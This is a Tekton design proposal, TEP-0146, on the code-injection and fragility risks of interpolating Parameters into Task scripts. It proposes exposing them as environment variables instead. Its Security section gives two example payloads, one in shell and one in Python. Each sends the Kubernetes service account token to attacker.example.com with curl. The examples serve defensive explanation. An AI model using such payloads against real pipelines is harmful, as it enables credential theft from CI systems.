---
status: proposed
title: Parameters in Script
creation-date: '2023-10-02'
last-updated: '2023-10-02'
authors:
- '@aprindle'
- '@jerop'
- '@sbwsg'
---

# TEP-0146: `Parameters` in `Script`
<!-- toc -->
- [Summary](#summary)
- [Motivation](#motivation)
  - [Goals](#goals)
    - [What is it trying to achieve?](#what-is-it-trying-to-achieve)
    - [How will we know that this has succeeded?](#how-will-we-know-that-this-has-succeeded)
  - [Non-Goals](#non-goals)
  - [Use Cases](#use-cases)
  - [Requirements](#requirements)
- [Proposal - Implicitly Project <code>Parameters</code> as Environment Variables in <code>Steps</code> (Language-Agnostic)](#proposal---implicitly-project--as-environment-variables-in--language-agnostic)
  - [Discussion](#discussion)
- [Design Details](#design-details)
- [Design Evaluation](#design-evaluation)
  - [Reusability](#reusability)
  - [Simplicity](#simplicity)
  - [Flexibility](#flexibility)
  - [Conformance](#conformance)
  - [Performance](#performance)
  - [Risks and Mitigations](#risks-and-mitigations)
  - [Drawbacks](#drawbacks)
- [Alternatives](#alternatives)
  - [Implicitly Project <code>Parameters</code> into the Filesystem of <code>Steps</code>](#implicitly-project--into-the-filesystem-of-)
      - [Discussion](#discussion-1)
  - [Combine Elements of Both Explicit Environment Variable and Filesystem Projection Solutions](#combine-elements-of-both-explicit-environment-variable-and-filesystem-projection-solutions)
    - [Discussion](#discussion-2)
  - [Reject <code>Parameters</code> in <code>Script</code> and provide instructions to fix](#reject--in--and-provide-instructions-to-fix)
      - [Discussion](#discussion-3)
- [Implementation Plan](#implementation-plan)
  - [Test Plan](#test-plan)
  - [Upgrade and Migration Strategy](#upgrade-and-migration-strategy)
  - [Implementation Pull Requests](#implementation-pull-requests)
- [References](#references)
<!-- /toc -->

## Summary
Using `Parameter` variables directly in `script` blocks in `Tasks` is a footgun
in two ways:
- **Security**: It is easy for a `Task` _author_ to accidentally introduce a vector
  for code injection and, by contrast, difficult for a `Task` _user_ to verify that
  such an injection can't or hasn't taken place.
- **Reliability**: It is easy for a `Task` _user_ to accidentally pass in a `Parameter`
  with a character that would make the `Script` invalid and fail the `Task`, making
  the `Task` extremely fragile.

The aim of this TEP is to introduce a safer and more reliable method to access `Parameter` variables from `Scripts`.

## Motivation
*Tekton Pipelines* provides variables used to inject values into the contents of certain
fields, including `Scripts`. The values you can inject come from a range of sources,
including `Parameters`. Interpolating `Parameters` in `Script` presents two main challenges:
**Security** and **Reliability**. In this section, we provide the background information and
expound on the challenges users face when interpolating `Parameters` in `Scripts`.

As [documented][params-vars-docs], this is the syntax of `Parameter` interpolation,
where `<name>` is the name of the `Parameter`:

```yaml
# dot notation
$(params.<name>)
# or bracket notation (wrapping <name> with either single or double quotes):
$(params['<name>'])
$(params["<name>"])
``` 

The mechanism of variable substitution is a string replacement that's performed by the
*Tekton Controller* when a `TaskRun` is executed.

Common examples of user-generated input that could be passed via `Parameter` and
interpolated in a `Script` include:
* Commit messages
* Pull request descriptions and comments
* Image names or registry URLs
* Project or test suites names
* Paths into `Workspaces`

Tekton's own use of `Parameter` variables has evolved to avoid placing them
directly in `Scripts`:
1. Migrated our plumbing repository from using `Parameters` directly
   (e.g.`$(params.foo)`) in `Script` to passing them in through environment variables
   (e.g. `${FOO}`).  This was a precaution against possible code injections to our
   continuous integration:
     * [plumbing-pr-973]
     * [plumbing-pr-974]
     * [plumbing-pr-975]
     * [plumbing-pr-976]
     * [plumbing-pr-977]
2. [Migrated][catalog-pr-711] the `git-clone` Catalog `Task` to use environment variables
   instead of direct `Parameter` injection and, in doing so, made a backwards incompatible
   change to it.
3. Host [guidance in the *Tekton Catalog*][catalog-recommendation] warning against
   `Parameters` in `Scripts`.

Given that we have recognized a flaw in our own usage, it bears exploring whether
this means there are flaws in the tool itself that allow this to occur. The flaws
were previously discussed in [TEP-0017][tep-0017], but we pushed back deciding on
a solution in favor of documenting the existing workarounds. It is time to revisit
the problem and explore a solution considering our:
1. Move towards a v1.X or v2 API - decide on path forward ahead of stabilizing the API
2. Change in usage of `Parameters` in `Script` in dogfooding
3. Focus on security, including leaning into secure by default

####  Security

It is easy for a `Task` _author_ to accidentally introduce a vector for code
injection and, by contrast, difficult for a `Task` _user_ to verify that such
an injection can't or hasn't taken place.

To audit whether a `Task` is at risk of code injection, a user would need
to determine two things: first whether that `Task` includes a `Parameter`
directly referenced from a `Script` and, if it does, whether that 
`Parameter` was ever populated using untrusted input.

To determine if a `Parameter` could have been populated by untrusted input
the user would need to:
1. read the `Task`
2. read all `Pipelines`, `PipelineRuns` and `Trigger Templates` that
   reference the `Task`
3. trace the values passed to that `Parameter` via those resources
   back to their original source
4. determine if that source could have been user-generated

One security risk is that an attacker can exfiltrate sensitive data, as shown in the
example below. We need to lean into being secure by default to prevent such attacks.

##### Example

A `Task` with a `Step` *foo* interpolates `Parameter` *bar* in its `Script`, as such:

`bash example`
```yaml
  steps:
  - name: foo
    image: myimage
    script: |
      echo $(params.bar)
```

As warned in the [recommendations][catalog-recommendation], an attacker can access the
service account token for the `TaskRun` using `Parameter` *bar* as `$(curl -s
http://attacker.example.com/?value=$(cat/var/run/secrets/kubernetes.io/serviceaccount/token))`.


`python example`
```yaml
  steps:
  - name: greet-user
    image: python:3.9-slim
    script: |
      #!/usr/bin/env python3
      user_name = '$(params.username)'
      print(f'Hello, {user_name}!')
```

Similarly for a python script, an attacker can access the service account token for the `TaskRun` using `Parameter` *bar* as `{os.system('curl -s http://attacker.example.com/?value=' + open('/var/run/secrets/kubernetes.io/serviceaccount/token').read())}`

###  Reliability

The interpolation of `Parameters` in `Script` is not aware of context - it is a simple string
replacement. As such, it is easy for a `Task` _User_ to accidentally pass in a `Parameter`
with a character that would make the `Script` invalid and fail the `Task`, making the
`Task` extremely fragile. Characters that can invalidate the `Script` include a space,
a quote sign, and a newline. An example with a quote sign is demonstrated below.
For further details, read the warning in the [recommendations][catalog-recommendation].

##### Example

A `Task` with a `Step` *foo* interpolates `Parameter` *bar* in its `Script`, as such:

```yaml
  steps:
  - name: foo
    image: myimage
    script: |
      echo $(params.bar)
```

A user can pass in `Parameter` *bar* with a single quote. The `Task` would fail because of
the unterminated quote string, instead of echoing the quote string.

### Goals

#### What is it trying to achieve?
The proposed solution is trying to achieve the following:

1. **`Tasks` should safely and reliably access `Parameter` variables from `Scripts`**.

   Replace direct interpolation with an alternative that does not put the `Parameter`
   into an executable context by default.

2. `Tasks` in the *Tekton Catalog* should be bumped to use the safer approach.
    - Given that this update would likely be backwards-incompatible, as it was in the
    [`git-clone` Task update in the Catalog][catalog-pr-711], the versions of those
    `Tasks` have to be bumped with this update, and their previous versions' docs 
     updated to warn about the issue.
    - Catalog `Tasks` that leverage this pattern to intentionally inject executable code
    (e.g. the `git-cli` Task [accepts a script to run as a param][git-cli]) can be updated
    to execute the contents of the `Parameter` from a file or call [`eval`](https://man7.org/linux/man-pages/man1/eval.1p.html) on it explicitly.

3. Tekton Pipelines and Catalog documentation should be updated to the new approach.

4. **`Tasks` should not support implicit runtime code injection**.

   Disallow interpolating `Param` values directly into executable
   contexts. If the user wants to execute the contents of a param as a
   script then they should be able to, but it shouldn't be possible
   without "opting in" to that behaviour by calling `eval` or writing
   the value of a param to a script and running it.

#### How will we know that this has succeeded?
We will now this has succeeded:
  1. When there is a method of securely and reliably uses `Parameters` in `script`s 
  2. When the current method with less security and reliability is deprecated/no-longer-allowed and using `Parameters` in `script`s is secure by default

### Non-Goals
Directly disallowing the use of `Param` values in `script`s without providing a feasible alternative.

### Use Cases
As described in the [original proposal][pipeline-issue-781], the use case for `Script`
in `Tasks` is:

> Users need an easy cruft-free way to express a multi-statement `Script` in the
> body of a `Task` `Step`, without having to understand advanced topics about
> `Containers`, like what an `entrypoint` or a `command` is.
>
> Users should only need to have passing familiarity with a shell environment
> to be successful using Tekton.

Problems with variable subsitution was noted in [original proposal][pipeline-issue-781]:

> How this syntax works with input substitutions, e.g., ``${inputs.params.flags}`` might
> also lead to confusion among users, which we should design for.

Users need a way to safely and reliably substitute `Parameters` in `Scripts` in `Steps`
of their `Tasks`. This would make it easier to use Tekton without learning advanced topics,
while still using it reliably and safely.

### Requirements

<!--
Describe constraints on the solution that must be met, such as:
- which performance characteristics that must be met?
- which specific edge cases that must be handled?
- which user scenarios that will be affected and must be accommodated?
-->

1. **[Secure by default in v1.X/v2][secure-by-default]**: Out of the box
   *Tekton Pipelines* v1.X/v2 should disallow common anti-patterns that
   can render a default install insecure.  For v1.X/v2 this means that the 
   solution propsed here would be the de-facto method for using Tekton Parameters
   in scripts when cutting a new Tekton API version (where backwards compatibility 
   isn't required).
2. **Easy to use**: Whatever replaces the direct use of `$(params.X)` in
   `script` should be unsurprising and memorable to ease friction in user
   migration.
3. **Automatable**: A script or program should be able to convert `Tasks`
   to the new approach. This might be impossible for all cases (e.g. if an
   unrecognized shebang has been used in the script) but a best-effort
   implementation should be provided.
4. **Backwards-compatible in v1**. If a user already has `Tasks`
   that use `$(params.X)` syntax in `script` then we should continue supporting
   that usage in v1 resources. Ideally, Tekton Pipelines would warn the user
   about it somehow.  If a cluster operator would like to disable the default 
   controller based direct param injection outright we can provide a feature-gate 
   to disable the default behaviour (opting into what would likely be the v1.X/v2 
   behaviour)
5. **Provide an escape hatch in v1.X/v2**. If a cluster
   operator or admin decides that they want to continue allowing
   `Parameter` variables to be directly injectable to `script` fields of
   `Steps` there should be some way for them to configure that.  This would 
   likely be done via a feature-gate that would re-enable the current default of 
   direct param injection.
6. **Minimize verbosity as much as possible**. The solution should try to streamline the process of passing parameters through the pipeline, tasks, and steps as much as possible. The approach should try to minimally add layers of complexity, attempt to streamline script-writing (as much as possible), and try to minimize any changes-necessary or have easy to use tooling for usage (see `Automatable` above).

## Suggested Solution - Explicitly Project `Parameters` as Environment Variables in `Steps` (Language-Agnostic)
We have projected `Parameters` as environment variables in the `git-clone` Task in the
Catalog and in our own plumbing repository. We can use this approach only we should make it explicit requiring a special suffix (`.env` in the examples belwo) vs implicit for the time being to allow for adoption, backwards compatilibility, and rollout options.  In doing this we can explicitly project `Parameters` as environment variables in `Steps`.
The environment variable should be prefixed with `PARAMS_` to make it clear and predictable.

```yaml
  # bash example for string param

  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone ${$(params.url.env)} # <--- needs to be manually updated w/ additional ${*} wrapping for shell usage
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone ${PARAMS_URL}
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_URL
      value: $(params.url)
    script: |
      git clone ${PARAMS_URL}
```

```yaml
  # python example for string param
  
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      #!/bin/env python
      import os
      print(os.environ[$(params.url.env)]) # <--- scripts to be manually updated to get values from env vars
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      #!/bin/env python
      import os
      print(os.environ[PARAMS_URL])
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_URL
      value: $(params.url)
    script: |
      #!/bin/env python
      import os
      print(os.environ[PARAMS_URL])
```


```yaml
  # bash example for object param - only supports object fields (string types)
  
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      echo ${$(params.obj.url.env)} # <--- needs to be manually updated w/ additional ${*} wrapping for shell usage
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      echo ${PARAMS_OBJ_URL} 
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_OBJ_URL
      value: $(params.obj.url)
    script: |
      echo ${PARAMS_OBJ_URL}
```

```yaml
  # bash example for array param - supports array param as comma seperated list and individual array indexes (string types)
  
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      echo ${$(params.arr)} # <--- needs to be manually updated w/ additional ${*} wrapping for shell usage
      echo ${$(params.arr[0])}
      echo ${$(params.arr[1])}
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      echo ${PARAMS_ARR}
      echo ${PARAMS_ARR_0}
      echo ${PARAMS_ARR_1}
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_ARR
      value: $(params.arr)
    - name: PARAMS_ARR_0
      value: $(params.arr[0])
    - name: PARAMS_ARR_1
      value: $(params.arr[1])
    script: |
      echo ${PARAMS_ARR}
      echo ${PARAMS_ARR_0}
      echo ${PARAMS_ARR_1}
```

### Discussion
This approach mutates the specification, but it is something we're already doing
with implicit `Parameters` per [TEP-0023][tep-0023].  This approach removes the insecure
default behaviour but in doing so unfortunately loses backwards-compatibility requiring users
to modify their `script` yaml (eg: `s/$(params.url)/${$(params.url)}` for the `shell` case).
This approach also has a difficult deprecation/onboarding story for users as there is no built in
alternative and changing defaults is a hard cutoff for them (eg: they are broken with a new release as 
the defaults change) vs for example an alternative method for doing this and a timeline for deprecating the 
default

<!-- ### Notes and Caveats -->

<!--
(optional)

Go in to as much detail as necessary here.
- What are the caveats to the proposal?
- What are some important details that didn't come across above?
- What are the core concepts and how do they relate?
-->

## Design Details
See above, more information is WIP - awaiting `proposed` sign-off
<!--
This section should contain enough information that the specifics of your
change are understandable. This may include API specs (though not always
required) or even code snippets. If there's any ambiguity about HOW your
proposal will be implemented, this is the place to discuss them.

If it's helpful to include workflow diagrams or any other related images,
add them under "/teps/images/". It's upto the TEP author to choose the name
of the file, but general guidance is to include at least TEP number in the
file name, for example, "/teps/images/NNNN-workflow.jpg".
-->

Considered Edge Cases and Gotchas:
* Conflicts with user-defined environment variables
    * In the case of a conflict with a user-defined environment variables, Tekton will throw a validation error stating that the user defined param should be renamed.
* Preventing conflicts with user-defined environment variables
    * We can use a longer `TEKTON_PARAMS` prefix on Tekton generated env vars to help prevent collisions with user created env vars.
    * We could also optionally add a sha suffix to the env var (based on the param name) to further unique-ify the env var name to reduce collision.


## Design Evaluation
See above, more information is TBD - awaiting `proposed` sign-off
<!--
How does this proposal affect the api conventions, reusability, simplicity, flexibility
and conformance of Tekton, as described in [design principles](https://github.com/tektoncd/community/blob/master/design-principles.md)
-->

### Reusability

<!--
https://github.com/tektoncd/community/blob/main/design-principles.md#reusability

- Are there existing features related to the proposed features? Were the existing features reused?
- Is the problem being solved an authoring-time or runtime-concern? Is the proposed feature at the appropriate level
authoring or runtime?
-->
- Are there existing features related to the proposed features? Were the existing features reused?
  - The solution outlined here is similar to the current `.path` field supported in `$(workspaces.<name>.path)`.
  - A related feature can be used in combination with this TEP is [[TEP-0144] Param Enum](https://github.com/tektoncd/community/pull/1072)

### Simplicity

- How does this proposal affect the user experience?
  - This proposal draws upon usage of a suffix (`.env`) on a param similar to how `.path` is supported 
  in `$(workspaces.<name>.path)` so there is some precendence this UX is supported by users
- What’s the current user experience without the feature and how challenging is it?
  - Currently Tekton directly interpolates the `Parameters` value into the `script` value given.  Adding the proposed solution does not change this - it provides additional UX options and maintains backwards compatibility.
- What will be the user experience with the feature? How would it have changed?
  - During the initial creation of this feature, the user experience will not change as the original UX/functionality will be preserved.  Assuming the proposed solution this feature requires - understanding it exists as an  option and modifying the necessary `script` usage doing something like `s/param.<name>/param.<name>.env` & `s/$(param.<name>)/${$(param.<name>.env)}` (for shell scripts)
- Does this proposal contain the bare minimum change needed to solve for the use cases?
  - Yes
- Are there any implicit behaviors in the proposal? Would users expect these implicit behaviors or would they be
surprising? Are there security implications for these implicit behaviors?
  - N/A

### Flexibility
- Are there dependencies that need to be pulled in for this proposal to work? What support or maintenance would be
required for these dependencies?
  - No
- Are we coupling two or more Tekton projects in this proposal (e.g. coupling Pipelines to Chains)?
   - No
- Are we coupling Tekton and other projects (e.g. Knative, Sigstore) in this proposal?
  - No
- Are there opinionated choices being made in this proposal? If so, are they necessary and can users extend it with their own choices?
  - The proposed solution attemps to operate in such a way that it is extensible by the user to support whatever language their `script` might be in

### Conformance

<!--
https://github.com/tektoncd/community/blob/main/design-principles.md#conformance

- Does this proposal require the user to understand how the Tekton API is implemented?
- Does this proposal introduce additional Kubernetes concepts into the API? If so, is this necessary?
- If the API is changing as a result of this proposal, what updates are needed to the
[API spec](https://github.com/tektoncd/pipeline/blob/main/docs/api-spec.md)?
-->
- Does this proposal require the user to understand how the Tekton API is implemented?
  - No, not directly.  The users will need to know this `.env` extension exists but this can states in our 
  best practices and also showup in the warning/error when the user attempt to not use this extension w/ `script`.
- Does this proposal introduce additional Kubernetes concepts into the API? If so, is this necessary?
  - No
- If the API is changing as a result of this proposal, what updates are needed to the
[API spec](https://github.com/tektoncd/pipeline/blob/main/docs/api-spec.md)?
  - None

### Performance
The proposed solution + alternatives outlined here should not meaningfully impact performance.

### Risks and Mitigations

<!--
What are the risks of this proposal and how do we mitigate? Think broadly.
For example, consider both security and how this will impact the larger
Tekton ecosystem. Consider including folks that also work outside the WGs
or subproject.
- How will security be reviewed and by whom?
- How will UX be reviewed and by whom?
-->
- What are the risks of this proposal and how do we mitigate?
  - This proposal is driven by the necessity to mitigate risks.  UX is the main risk which is the proposed solution attempts to mitigate by sensibly using feature-gates, adhereing to a phased rollout (keeping prior functionality) and offering sensible warnings, errors, and building on existing Tekton UX (`$(params.<name>.env)` similar to existing `$(workspaces.<name>.path)`).  
- How will security be reviewed and by whom?
  - TBD
- How will UX be reviewed and by whom?
  - TBD

### Drawbacks
One potential drawbacks to the proposed solution(s) in the TEP is potential friction users will face
in migrating their Tekton configuration to the new `.env` format. NOTE: migration is only necessary after
the deprecation period

## Alternatives

<!--
What other approaches did you consider and why did you rule them out? These do
not need to be as detailed as the proposal, but should include enough
information to express the idea and why it was not acceptable.
-->

###  Implicitly Project `Parameters` into the Filesystem of `Steps`

Write `Parameters` in files - `/tekton/parameters/<param-name>` - mounted into `Steps`
in the same way that `Results` are supplied. The file path for the param
would be made available via a variable (possibly reusing `$(params.<name>)`.  Helper scripts 
would also be created here to improve the UX.


```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      IFS='' read -d -r PARAMS_URL /tekton/params/url
      git clone ${PARAMS_URL}
```

For this method, we should provide helper functions as the UX here is difficult for users, something like:
```yaml
    script: |
      source /tekton/params/.helpers 
      git clone $(fromParams url)
```

This approach is also under discussion in the context of changing the way `Result`
values are stored in [TEP-0086][tep-0086-alt]. In that proposal a sidecar is
responsible for fetching `Results` from previous `Tasks` and writing them to
a location on disk for use as `Parameters`.  This 

##### Discussion

This approach aligns well with the proposal in [TEP-0086][tep-0086-prop], and
brings consistency in how we supply both `Parameters` and `Results` to `Steps`.

###  Combine Elements of Both Explicit Environment Variable and Filesystem Projection Solutions

Building on environment variable alternatives (1.0 & 1.1), and filsystem alternatives (2) Tekton Pipelines could offer an explicit option to the user whether to project as env (language agnostic OR shell format) or file.  There could be different env syntaxes for shell (most used in tasks) vs language agnostic env vars to make the option more UX friendly and backwards compatible for the majority of tasks (which use `sh` or `bash`).
```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone ${$(params.url1.env)}
      git clone $(params.url2.env_shell)
      git clone $(params.url3.path)
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_URL1
      value: $(params.url1)
    script: |
      git clone ${PARAMS_URL1}
      git clone ${PARAMS_URL2}
      IFS='' read -d -r PARAMS_URL3 /tekton/params/url3
      git clone ${PARAMS_URL3}
```

####  Discussion

Similar to the other options this mutates the spec, though does so at the user's
discretion. This alternative could be an extension of 1.0 and could be implemented piecemeal with only a single implicit env format supported initially (`.env`) with additional implicit env formats and filesystem (`$(params.bar.path)`) support added later if needed.

###  Reject `Parameters` in `Script` and provide instructions to fix

During validation we could detect `Parameters` used in `Script` blocks and return
a helpful message to the user that they need to rewrite their `Task` to move the
`Parameters` into environment variables.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
```

When the Tekton Pipelines Controller sees this `Script` it rejects the `Task` submission
with an error, such as:

```
spec.steps[0].script: $(params.url) cannot be injected into a script, consider moving
into an environment variable on the Step.
```

```yaml
  # After
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAMS_URL
      value: $(params.url)
    script: |
      git clone "${PARAMS_URL}"
```

##### Discussion

Non-mutating but doesn't help the user as directly as mutating the spec.


## Implementation Plan

1. Introduce the `params.<name>.env` syntax (from `Suggested Solution - Explicitly Project `Parameters` as Environment Variables in `Steps` (Language-Agnostic)`) and document the new approach.
2. Update the Tekton Catalog tasks to adopt the new syntax.
3. For direct param injection in v1, issue a warning in the controller.  Additionally provide a feature-gate to let cluster operators disable direct param injection (backwards compatibility breaking BUT opt-in)
4. At a later time or in an updated `apiVersion` (v1.X after the 9 mo deprecation policy OR v2), only support the new `params.<name>.env` method and provide an error message for older methods + tooling to aid in migration.  We can provide a feature-gate to re-enable the old behaviour as needed.
5. [optional] Possibly introduce a `tkn` migration command to help users transition or implement controller auto-migration for cases this is feasible (and explain manual changes/invalid-spec to user as needed during validation)


### Test Plan
Testing will focus on ensuring that the new `.env` interpolation method works reliably and securely across different scripting languages.  Integration tests will be added in addition to unit tests to ensure compability
across languages, `Param` types, and `Param` use cases.


### Upgrade and Migration Strategy

The strategy focuses on a gradual transition, introducing the new method while providing warnings for the old method. Tools might be provided to aid migration.

### Implementation Pull Requests
TBD
<!--
Once the TEP is ready to be marked as implemented, list down all the GitHub
merged pull requests.

Note: This section is exclusively for merged pull requests for this TEP.
It will be a quick reference for those looking for implementation of this TEP.
-->

## References

* Issues:
  * [pipeline-issue-3226]
  * [triggers-issue-675]
* [Catalog Guidance to Avoid Using `Parameters` in `Script` Blocks][catalog-recommendation]
* Recent changes to the *Tekton Plumbing* to remove `$(params)` syntax from `script` blocks:
  * [plumbing-pr-973]
  * [plumbing-pr-974]
  * [plumbing-pr-975]
  * [plumbing-pr-976]
  * [plumbing-pr-977]
* [Change to `git-clone` Catalog Task to remove param injection][catalog-pr-711]
* Tekton Enhancement Proposals:
  * [TEP-0017: Shell-Escaped Parameters][tep-0017]
  * [TEP-0023: Implicit Parameters][tep-0023]
  * [TEP-0099: Parameters In Scripts][tep-0099]
* Third Party Documents Identifying Env Var Usage As Best Practice:
  * [Security Hardening For Github Actions - Using An Intermediate Environment Variable][security-hardening-for-github-actions]

[catalog-recommendation]: https://github.com/tektoncd/catalog/blob/main/recommendations.md#dont-use-interpolation-in-scripts-or-string-arguments
[git-cli]: https://github.com/tektoncd/catalog/blob/4f365ec668973abe3c2df87323b3b7e4bd4a614a/task/git-cli/0.3/git-cli.yaml#L137
[catalog-pr-711]: https://github.com/tektoncd/catalog/pull/711
[plumbing-pr-973]: https://github.com/tektoncd/plumbing/pull/973
[plumbing-pr-974]: https://github.com/tektoncd/plumbing/pull/974
[plumbing-pr-975]: https://github.com/tektoncd/plumbing/pull/975
[plumbing-pr-976]: https://github.com/tektoncd/plumbing/pull/976
[plumbing-pr-977]: https://github.com/tektoncd/plumbing/pull/977
[secure-by-default]: https://en.wikipedia.org/wiki/Secure_by_default
[params-vars-docs]: https://github.com/tektoncd/pipeline/blob/main/docs/tasks.md#substituting-parameters-and-resources
[tep-0086-alt]: https://github.com/tektoncd/community/pull/521/files#diff-6057e05e8be034edde14ed71128372a35468e25c3f6c9809be8cc8a1e78ada94R287
[tep-0086-prop]: https://github.com/tektoncd/community/pull/521/files#diff-6057e05e8be034edde14ed71128372a35468e25c3f6c9809be8cc8a1e78ada94R275
[pipeline-issue-781]: https://github.com/tektoncd/pipeline/issues/781
[tep-0017]: https://github.com/tektoncd/community/pull/208
[tep-0023]: https://github.com/tektoncd/community/blob/main/teps/0023-implicit-mapping.md
[tep-0099]: https://github.com/tektoncd/community/pull/596
[triggers-issue-675]: https://github.com/tektoncd/triggers/issues/675
[pipeline-issue-3226]: https://github.com/tektoncd/pipeline/issues/3226
[templating-doc]: https://docs.google.com/document/d/1h_3vSApIsuiwGkrqSiegi4NVaYG4oVzBquGAhIN6qGM/edit?usp=sharing
[security-hardening-for-github-actions]: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
